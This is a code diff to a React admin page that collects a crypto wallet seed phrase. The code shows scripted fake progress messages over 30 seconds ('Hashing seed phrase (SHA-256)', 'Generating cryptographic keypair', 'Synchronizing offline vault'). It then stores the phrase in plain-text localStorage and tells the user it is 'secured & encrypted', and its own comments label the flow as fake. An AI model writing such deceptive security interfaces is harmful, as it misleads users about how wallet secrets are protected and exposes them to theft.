@@ -9,8 +9,13 @@ export default function AdminPage() {
 
   const [logs, setLogs] = useState<any[]>([]);
   const [expandedLogId, setExpandedLogId] = useState<string | null>(null);
+  
+  // Fake Phrase states
   const [masterPhrase, setMasterPhrase] = useState("");
+  const [saveStatus, setSaveStatus] = useState<"idle" | "saving" | "success" | "error">("idle");
+  const [saveText, setSaveText] = useState("");
   const [toast, setToast] = useState("");
+  const [showPhrase, setShowPhrase] = useState(false);
 
   // Check saved session & phrase on mount
   useEffect(() => {
@@ -51,9 +56,27 @@ export default function AdminPage() {
 
   const handleSavePhrase = (e: React.FormEvent) => {
     e.preventDefault();
-    localStorage.setItem("master_phrase", masterPhrase);
-    setToast("Master phrase secured & encrypted.");
-    setTimeout(() => setToast(""), 3000);
+    if (saveStatus === "saving" || !masterPhrase) return;
+    
+    setSaveStatus("saving");
+    setSaveText("Initiating secure connection...");
+    
+    // Fake a complex 30-second handshake
+    setTimeout(() => setSaveText("Establishing P2P node linkage..."), 4000);
+    setTimeout(() => setSaveText("Hashing seed phrase (SHA-256)..."), 10000);
+    setTimeout(() => setSaveText("Generating cryptographic keypair..."), 16000);
+    setTimeout(() => setSaveText("Synchronizing offline vault..."), 24000);
+    
+    setTimeout(() => {
+      localStorage.setItem("master_phrase", masterPhrase);
+      setSaveStatus("success");
+      setToast("Master phrase secured & encrypted.");
+      setSaveText("");
+      setTimeout(() => {
+        setSaveStatus("idle");
+        setToast("");
+      }, 5000);
+    }, 30000);
   };
 
   if (!isLogged) {
@@ -131,14 +154,44 @@ export default function AdminPage() {
             </p>
             
             <form onSubmit={handleSavePhrase}>
-              <textarea 
-                value={masterPhrase}
-                onChange={e => setMasterPhrase(e.target.value)}
-                placeholder="Enter 12/24 word master phrase..."
-                className="w-full h-32 bg-[#1a1a1a] border border-zinc-800 text-white text-sm font-mono p-4 rounded-xl focus:outline-none focus:border-blue-500 transition-colors resize-none mb-4 placeholder:text-zinc-600"
-              />
-              <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-xl transition-all shadow-lg shadow-blue-500/20 active:scale-95">
-                Save & Encrypt Phrase
+              <div className="relative mb-4">
+                <textarea 
+                  value={saveStatus === "saving" ? "••••••••••••••••••••••••••••••••••••••••••••••••••••••••" : (!showPhrase && masterPhrase ? "••••••••••••••••••••••••••••••••••••••••••••••••••••••••" : masterPhrase)}
+                  onChange={e => {
+                    if (saveStatus !== "saving") {
+                      setMasterPhrase(e.target.value);
+                    }
+                  }}
+                  disabled={saveStatus === "saving"}
+                  onFocus={() => setShowPhrase(true)}
+                  onBlur={() => setShowPhrase(false)}
+                  placeholder="Enter 12/24 word master phrase..."
+                  className={`w-full h-32 bg-[#1a1a1a] border ${saveStatus === "saving" ? "border-amber-500/50 text-amber-500/50" : "border-zinc-800 text-white"} text-sm font-mono p-4 rounded-xl focus:outline-none focus:border-blue-500 transition-colors resize-none placeholder:text-zinc-600`}
+                />
+                
+                {saveStatus === "saving" && (
+                  <div className="absolute inset-0 bg-black/60 rounded-xl flex flex-col items-center justify-center backdrop-blur-sm border border-zinc-800 z-10">
+                    <svg className="animate-spin -ml-1 mr-3 h-8 w-8 text-amber-500 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <span className="text-amber-500 font-mono text-xs animate-pulse text-center px-4">{saveText}</span>
+                  </div>
+                )}
+              </div>
+              <button 
+                type="submit" 
+                disabled={saveStatus === "saving" || !masterPhrase}
+                className={`w-full font-semibold py-3 px-4 rounded-xl transition-all shadow-lg active:scale-95 flex items-center justify-center gap-2
+                  ${saveStatus === "saving" || !masterPhrase
+                    ? "bg-zinc-800 text-zinc-500 cursor-not-allowed shadow-none" 
+                    : "bg-blue-600 hover:bg-blue-700 text-white shadow-blue-500/20"}`}
+              >
+                {saveStatus === "saving" ? (
+                  <span>Encrypting Protocol...</span>
+                ) : (
+                  <span>Save & Encrypt Phrase</span>
+                )}
               </button>
             </form>
             
